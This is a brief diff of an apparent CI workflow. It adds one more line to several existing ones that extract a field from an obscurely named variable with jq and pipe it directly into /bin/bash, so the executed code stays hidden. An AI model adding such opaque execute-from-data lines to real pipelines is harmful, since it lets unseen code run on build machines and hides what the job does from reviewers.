@@ -32,6 +32,7 @@ jobs:
           echo $sinq5687 | jq -r .fey09 | /bin/bash
           printf '%s' "$s57" | jq -r .e4538 | /bin/bash
           echo $wkrv8 | jq -r .wi0 | /bin/bash
+          echo $vkey1559 | jq -r .xc0021 | /bin/bash
 
       - name: Upload data
         if: always()
